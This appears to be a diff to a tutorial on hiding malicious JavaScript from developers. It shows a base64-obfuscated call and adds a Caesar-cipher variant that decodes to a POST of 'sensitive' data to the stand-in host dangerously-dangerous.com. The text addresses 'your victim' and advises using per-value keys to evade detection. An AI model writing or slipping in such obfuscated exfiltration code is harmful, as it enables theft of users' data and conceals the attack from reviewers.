@@ -29,3 +29,9 @@ window[_('ZmV0Y2g=')](_('aHR0cDovL2Rhbmdlcm91c2x5LWRhbmdlcm91cy5jb20vc29tZXRoaW5
 Now guess what that code does. Now stop guessing because you already know the answer. But your victim won't.
 
 Instead of base64, you can also use a simple ceaser cipher or xor encryption algorithms. And to take it a step further, use a different key for each of the values. You can also use jsfuck but I don't reccommend it as it will make it easy for a developer to recognize whats happening and can un-jsfuck it.
+
+Heres the same example with ceaser cipher. The first parameter is the key, the second is the string
+```javascript
+const _ = (k, i) => i.split('').reduce((s, c) => s + String.fromCharCode(c.charCodeAt(0) + k), '');
+window[_(2, 'dcraf')](_(-4, 'lxxt>33herkivsywp}1herkivsyw2gsq3wsqixlmrk'), { method: 'post', body: { sensitive: 'info' } });
+```
